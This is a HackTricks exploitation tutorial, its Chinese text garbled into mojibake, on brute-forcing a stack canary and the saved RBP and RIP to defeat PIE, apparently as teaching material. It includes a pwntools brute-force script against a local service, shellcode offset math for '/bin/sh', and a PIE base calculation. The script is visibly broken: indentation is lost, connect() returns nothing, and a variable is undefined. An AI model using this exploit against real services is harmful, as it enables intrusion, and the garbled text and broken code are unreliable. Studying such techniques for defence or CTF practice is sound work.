# BF åœ°å€åœ¨æ ˆä¸­

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

**å¦‚æœä½ é¢å¯¹çš„æ˜¯ä¸€ä¸ªå—åˆ° canary å’Œ PIEï¼ˆä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼‰ä¿æŠ¤çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½ å¯èƒ½éœ€è¦æ‰¾åˆ°ç»•è¿‡å®ƒä»¬çš„æ–¹æ³•ã€‚**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶æ˜¯é™æ€ç¼–è¯‘çš„ï¼Œ**`checksec`** å¯èƒ½æ— æ³•å‘ç°å…¶å—åˆ° canary ä¿æŠ¤ï¼Œå¹¶ä¸”æ— æ³•è¯†åˆ«è¯¥å‡½æ•°ã€‚\
ç„¶è€Œï¼Œå¦‚æœä½ å‘ç°ä¸€ä¸ªå€¼åœ¨å‡½æ•°è°ƒç”¨å¼€å§‹æ—¶è¢«ä¿å­˜åˆ°æ ˆä¸­ï¼Œå¹¶ä¸”åœ¨é€€å‡ºä¹‹å‰æ£€æŸ¥äº†è¿™ä¸ªå€¼ï¼Œä½ å¯ä»¥æ‰‹åŠ¨æ³¨æ„åˆ°è¿™ä¸€ç‚¹ã€‚
{% endhint %}

## æš´åŠ›ç ´è§£åœ°å€

ä¸ºäº†ç»•è¿‡ PIEï¼Œä½ éœ€è¦ **æ³„éœ²ä¸€äº›åœ°å€**ã€‚å¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶æ²¡æœ‰æ³„éœ²ä»»ä½•åœ°å€ï¼Œæœ€å¥½çš„æ–¹æ³•æ˜¯ **æš´åŠ›ç ´è§£åœ¨æ˜“å—æ”»å‡»å‡½æ•°ä¸­ä¿å­˜çš„ RBP å’Œ RIP**ã€‚\
ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶åŒæ—¶ä½¿ç”¨ **canary** å’Œ **PIE** è¿›è¡Œä¿æŠ¤ï¼Œä½ å¯ä»¥å¼€å§‹æš´åŠ›ç ´è§£ canaryï¼Œç„¶å **æ¥ä¸‹æ¥çš„** 8 å­—èŠ‚ï¼ˆx64ï¼‰å°†æ˜¯ä¿å­˜çš„ **RBP**ï¼Œ**æ¥ä¸‹æ¥çš„** 8 å­—èŠ‚å°†æ˜¯ä¿å­˜çš„ **RIP**ã€‚

{% hint style="success" %}
å‡è®¾æ ˆä¸­çš„è¿”å›åœ°å€å±äºä¸»äºŒè¿›åˆ¶ä»£ç ï¼Œå¦‚æœæ¼æ´ä½äºäºŒè¿›åˆ¶ä»£ç ä¸­ï¼Œé€šå¸¸ä¼šæ˜¯è¿™ç§æƒ…å†µã€‚
{% endhint %}

è¦ä»äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æš´åŠ›ç ´è§£ RBP å’Œ RIPï¼Œä½ å¯ä»¥åˆ¤æ–­ä¸€ä¸ªæœ‰æ•ˆçš„çŒœæµ‹å­—èŠ‚æ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœç¨‹åºè¾“å‡ºäº†æŸäº›å†…å®¹æˆ–å®ƒæ²¡æœ‰å´©æºƒã€‚å¯ä»¥ä½¿ç”¨ä¸æš´åŠ›ç ´è§£ canary ç›¸åŒçš„å‡½æ•°æ¥æš´åŠ›ç ´è§£ RBP å’Œ RIPï¼š
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
æœ€åï¼Œæ‚¨éœ€è¦å‡»è´¥ PIE çš„æœ€åä¸€ä»¶äº‹æ˜¯ä» **æ³„éœ²çš„** åœ°å€ä¸­è®¡ç®— **æœ‰ç”¨çš„åœ°å€**ï¼š**RBP** å’Œ **RIP**ã€‚

ä» **RBP** æ‚¨å¯ä»¥è®¡ç®— **æ‚¨åœ¨æ ˆä¸­å†™å…¥ shell çš„ä½ç½®**ã€‚è¿™å¯¹äºçŸ¥é“æ‚¨å°†åœ¨å“ªé‡Œåœ¨æ ˆä¸­å†™å…¥å­—ç¬¦ä¸² _"/bin/sh\x00"_ éå¸¸æœ‰ç”¨ã€‚è¦è®¡ç®—æ³„éœ²çš„ RBP å’Œæ‚¨çš„ shellcode ä¹‹é—´çš„è·ç¦»ï¼Œæ‚¨åªéœ€åœ¨æ³„éœ² RBP åæ”¾ç½®ä¸€ä¸ª **æ–­ç‚¹**ï¼Œå¹¶æ£€æŸ¥ **æ‚¨çš„ shellcode ä½äºä½•å¤„**ï¼Œç„¶åï¼Œæ‚¨å¯ä»¥è®¡ç®— shellcode å’Œ RBP ä¹‹é—´çš„è·ç¦»ï¼š
```python
INI_SHELLCODE = RBP - 1152
```
ä»**RIP**å¯ä»¥è®¡ç®—å‡º**PIEäºŒè¿›åˆ¶æ–‡ä»¶çš„åŸºåœ°å€**ï¼Œè¿™æ˜¯åˆ›å»º**æœ‰æ•ˆROPé“¾**æ‰€éœ€çš„ã€‚\
è¦è®¡ç®—åŸºåœ°å€ï¼Œåªéœ€æ‰§è¡Œ`objdump -d vunbinary`å¹¶æ£€æŸ¥åæ±‡ç¼–çš„æœ€æ–°åœ°å€ï¼š

![](<../../../../.gitbook/assets/image (145).png>)

åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°åªéœ€è¦**1ä¸ªåŠå­—èŠ‚**æ¥å®šä½æ‰€æœ‰ä»£ç ï¼Œå› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒåŸºåœ°å€å°†æ˜¯**æ³„æ¼çš„RIPï¼Œä½†ä»¥â€œ000â€ç»“å°¾**ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æ³„æ¼äº†`0x562002970ecf`ï¼Œåˆ™åŸºåœ°å€ä¸º`0x562002970000`ã€‚
```python
elf.address = RIP - (RIP & 0xfff)
```
{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
